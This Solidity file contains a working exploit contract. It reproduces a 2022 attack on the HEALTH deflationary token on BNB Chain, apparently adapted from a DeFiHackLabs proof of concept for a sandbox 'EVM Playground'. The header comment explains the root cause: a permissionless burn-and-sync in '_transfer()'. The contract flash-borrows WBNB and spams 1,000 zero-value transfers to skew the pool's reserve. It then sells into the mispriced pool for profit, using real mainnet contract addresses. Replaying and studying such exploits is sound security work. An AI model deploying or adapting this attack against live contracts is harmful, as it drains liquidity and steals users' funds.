// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2022-10-HEALTH).
//
// The DeFiHackLabs PoC (test/HEALTH_exp.sol) runs the attack INLINE in the
// Foundry `ContractTest` harness — the DODO DVM flash-loan callback
// `DPPFlashLoanCall` lives on the test itself (`assetTo = address(this)`),
// `attacker = address(this)`, and profit is measured as
// `WBNB.balanceOf(address(this))`. There is no standalone contract to deploy.
// This file is a faithful, self-contained copy of that inline attack (the
// testExploit body + DPPFlashLoanCall callback + minimal inline interfaces — no
// imports so it compiles anywhere), compiled inside the registry forge project.
// Logic and constants are copied verbatim from test/HEALTH_exp.sol.
//
// Root cause: HEALTH is a deflation token whose `_transfer()` runs a per-pair
// "drip burn" once a timer elapses: any non-pair sender burns `burnFee/1000`
// (0.1%) of the PAIR's HEALTH balance and immediately calls `pair.sync()`. That
// deletes HEALTH from the pair without removing any WBNB, breaking the
// constant-product invariant in favor of HEALTH holders. The trigger is
// permissionless and value-independent — a `transfer(self, 0)` no-op still
// fires it. The attacker flash-borrows 40 WBNB, buys HEALTH to become the
// dominant holder, spams 1,000 zero-value self-transfers to ratchet the pair's
// HEALTH reserve down ~63% (WBNB untouched), then sells its HEALTH back into
// the now-mispriced pool for ~56.6 WBNB, repays 40, and keeps ~16.64 WBNB.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external;
    function transfer(address, uint256) external;
}

interface IUniswapV2Router02 {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

interface IDVM {
    function flashLoan(uint256 baseAmount, uint256 quoteAmount, address assetTo, bytes calldata data) external;
}

contract HEALTHDrain {
    IERC20 constant HEALTH_TOKEN = IERC20(0x32B166e082993Af6598a89397E82e123ca44e74E);
    IERC20 constant WBNB_TOKEN = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IUniswapV2Router02 constant PS_ROUTER = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    address constant DODO_DVM = 0x0fe261aeE0d1C4DFdDee4102E82Dd425999065F4;

    function run() external {
        // Approving PancakeSwap router to spend attacker's WBNB and HEALTH.
        WBNB_TOKEN.approve(address(PS_ROUTER), type(uint256).max);
        HEALTH_TOKEN.approve(address(PS_ROUTER), type(uint256).max);

        // Requesting 40 WBNB via flashloan from DODO DVM. Payload is in the callback (DPPFlashLoanCall).
        IDVM(DODO_DVM).flashLoan(40 * 1e18, 0, address(this), new bytes(1));
    }

    /*
     * Callback function called by DODO DVM during the flashloan
     */
    function DPPFlashLoanCall(address, /*sender*/ uint256, /*baseAmount*/ uint256, /*quoteAmount*/ bytes calldata /*data*/ ) external {
        // Swap all WBNB to HEALTH
        _WBNBToHEALTH();

        // Actual payload exploiting the vulnerability in `_transfer()` function.
        // Each zero-value self-transfer burns 0.1% of the pair's HEALTH and
        // sync()s, ratcheting the HEALTH reserve down while WBNB stays fixed.
        for (uint256 i = 0; i < 1000; i++) {
            HEALTH_TOKEN.transfer(address(this), 0);
        }

        // Swap all HEALTH to WBNB to repay the flashloan and keep the profit.
        _HEALTHToWBNB();

        // Returning only the 40 flashloaned WBNB.
        WBNB_TOKEN.transfer(DODO_DVM, 40 * 1e18);
    }

    /**
     * Auxiliary function to swap all WBNB to HEALTH
     */
    function _WBNBToHEALTH() internal {
        address[] memory path = new address[](2);
        path[0] = address(WBNB_TOKEN);
        path[1] = address(HEALTH_TOKEN);
        PS_ROUTER.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            WBNB_TOKEN.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );
    }

    /**
     * Auxiliary function to swap all HEALTH to WBNB
     */
    function _HEALTHToWBNB() internal {
        address[] memory path = new address[](2);
        path[0] = address(HEALTH_TOKEN);
        path[1] = address(WBNB_TOKEN);
        PS_ROUTER.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            HEALTH_TOKEN.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );
    }
}
